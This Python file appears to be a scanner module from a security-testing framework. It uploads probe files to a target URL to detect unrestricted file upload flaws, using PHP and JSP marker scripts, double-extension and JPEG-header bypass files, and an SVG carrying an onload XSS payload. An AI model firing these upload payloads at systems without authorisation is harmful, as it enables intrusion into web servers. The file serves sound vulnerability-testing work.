"""
FileUploadTool â€” Unrestricted file upload exploitation.

Tests for:
- Extension bypass (double extension, null byte, case variation)
- Content-type bypass
- Web shell upload
"""
import aiohttp
from io import BytesIO
from dataclasses import dataclass

from sentinel.tools.base import ToolOutput
from sentinel.logging_config import get_logger

logger = get_logger(__name__)


@dataclass
class UploadPayload:
    name: str
    filename: str
    content_type: str
    content: bytes
    indicator: str


class FileUploadTool:
    name = "file_upload"
    description = "Test for unrestricted file upload vulnerabilities"

    PAYLOADS = [
        UploadPayload("php_shell", "shell.php", "application/x-php",
                      b"<?php echo 'SENTINEL_UPLOAD_TEST'; ?>", "SENTINEL_UPLOAD_TEST"),
        UploadPayload("php_double_ext", "shell.php.jpg", "image/jpeg",
                      b"\xff\xd8\xff\xe0<?php echo 'SENTINEL_UPLOAD_TEST'; ?>", "SENTINEL_UPLOAD_TEST"),
        UploadPayload("phtml_ext", "shell.phtml", "text/html",
                      b"<?php echo 'SENTINEL_UPLOAD_TEST'; ?>", "SENTINEL_UPLOAD_TEST"),
        UploadPayload("jsp_shell", "shell.jsp", "application/octet-stream",
                      b'<%= "SENTINEL_UPLOAD_TEST" %>', "SENTINEL_UPLOAD_TEST"),
        UploadPayload("svg_xss", "test.svg", "image/svg+xml",
                      b'<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><text>SENTINEL_UPLOAD_TEST</text></svg>',
                      "SENTINEL_UPLOAD_TEST"),
        UploadPayload("html_upload", "test.html", "text/html",
                      b"<html><body>SENTINEL_UPLOAD_TEST</body></html>", "SENTINEL_UPLOAD_TEST"),
    ]

    async def execute(
        self,
        upload_url: str,
        file_field_name: str = "file",
        additional_data: dict = None,
        headers: dict = None,
        check_url_pattern: str = None,
    ) -> ToolOutput:
        findings = []

        async with aiohttp.ClientSession() as session:
            for payload in self.PAYLOADS:
                try:
                    data = aiohttp.FormData()
                    data.add_field(
                        file_field_name,
                        BytesIO(payload.content),
                        filename=payload.filename,
                        content_type=payload.content_type,
                    )
                    if additional_data:
                        for k, v in additional_data.items():
                            data.add_field(k, v)

                    async with session.post(upload_url, data=data, headers=headers) as resp:
                        body = await resp.text()

                        if resp.status in (200, 201, 302):
                            uploaded_url = self._extract_upload_url(body, check_url_pattern, payload.filename)
                            if uploaded_url:
                                async with session.get(uploaded_url) as check_resp:
                                    check_body = await check_resp.text()
                                    if payload.indicator in check_body:
                                        findings.append({
                                            "payload": payload.name,
                                            "filename": payload.filename,
                                            "uploaded_url": uploaded_url,
                                            "evidence": f"Uploaded file executed at {uploaded_url}",
                                        })
                                        logger.info(f"File upload vuln confirmed: {payload.name}")
                            else:
                                findings.append({
                                    "payload": payload.name,
                                    "filename": payload.filename,
                                    "uploaded_url": None,
                                    "evidence": f"Upload accepted (status {resp.status}) but file location unknown",
                                })

                except Exception as e:
                    logger.debug(f"Upload payload {payload.name} failed: {e}")

        return ToolOutput(
            success=len(findings) > 0,
            data={"findings": findings},
            tool_name=self.name,
        )

    def _extract_upload_url(self, response_body: str, pattern: str, filename: str) -> str:
        """Try to find the URL of the uploaded file from the response."""
        import re
        if pattern:
            match = re.search(pattern.replace("{filename}", re.escape(filename)), response_body)
            if match:
                return match.group(0)
        return ""
